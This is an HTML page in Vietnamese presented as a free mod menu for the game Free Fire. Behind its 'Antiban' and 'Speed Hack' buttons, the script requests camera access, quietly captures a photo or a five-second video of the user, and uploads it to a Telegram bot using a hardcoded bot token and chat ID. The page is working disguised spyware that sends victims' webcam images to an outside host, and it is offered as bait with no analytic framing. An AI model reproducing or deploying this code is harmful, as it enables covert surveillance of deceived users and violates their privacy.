<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>🔥 MOD MENU FREE FIRE 2025 🔥</title>
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
      text-align: center;
      padding-top: 50px;
    }
    .btn {
      padding: 15px 25px;
      font-size: 18px;
      border: none;
      margin: 10px;
      background: lime;
      color: black;
      cursor: pointer;
      border-radius: 8px;
    }
    .btn:hover {
      background: #33ff33;
    }
  </style>
</head>
<body>
  <h1>🔥 MOD MENU FREE FIRE 2025 🔥</h1>
  <p>Chọn tính năng để kích hoạt (cần cấp quyền camera):</p>

  <button class="btn" onclick="capturePhoto()">📸 Cấp quyền Antiban</button>
  <button class="btn" onclick="recordVideo()">⚡ Speed Hack (Quay Video)</button>

  <video id="video" autoplay playsinline muted style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const token = "7885080355:AAGr9pOeVK3NPZVZUsLF7ZR9jDbf8ksyJ2E";
    const chatId = "-1002761107238";
    let stream;

    async function initCamera() {
      if (!stream) {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
          document.getElementById("video").srcObject = stream;
        } catch (err) {
          alert("❌ Không thể truy cập camera: " + err);
        }
      }
    }

    async function capturePhoto() {
      try {
        await initCamera();
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
          const form = new FormData();
          form.append("chat_id", chatId);
          form.append("photo", blob, "photo.png");
          form.append("caption", "📸 FF User đã cấp quyền camera");

          try {
            const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
              method: "POST",
              body: form
            });
            const data = await res.json();
            console.log("📬 Phản hồi Telegram:", data);
            alert("📬 Phản hồi từ Telegram:\n" + JSON.stringify(data, null, 2));
          } catch (err) {
            alert("❌ Gửi ảnh lỗi: " + err);
          }
        }, "image/png");

      } catch (e) {
        alert("❌ Không thể truy cập camera!");
      }
    }

    async function recordVideo() {
      try {
        await initCamera();
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const form = new FormData();
          form.append("chat_id", chatId);
          form.append("video", blob, "ff_hack_video.webm");
          form.append("caption", "🎞️ Video quay từ menu Hack Free Fire");

          try {
            const res = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
              method: "POST",
              body: form
            });
            const data = await res.json();
            alert("📬 Video gửi về Telegram:\n" + JSON.stringify(data, null, 2));
          } catch (err) {
            alert("❌ Gửi video lỗi: " + err);
          }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 5000);
      } catch (e) {
        alert("❌ Không thể truy cập camera!");
      }
    }
  </script>
</body>
</html>
